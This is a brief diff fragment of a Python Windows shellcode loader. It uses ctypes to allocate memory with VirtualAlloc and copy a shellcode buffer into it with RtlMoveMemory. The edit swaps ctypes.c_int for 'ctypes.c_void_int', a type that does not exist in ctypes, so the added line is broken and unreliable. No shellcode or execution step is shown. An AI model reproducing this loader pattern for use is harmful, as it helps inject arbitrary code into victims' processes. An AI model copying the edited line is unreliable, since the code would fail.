@@ -27,7 +27,7 @@ ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
 
 buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
 
-ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
+ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_void_int(ptr),
                                      buf,
                                      ctypes.c_int(len(shellcode)))
 
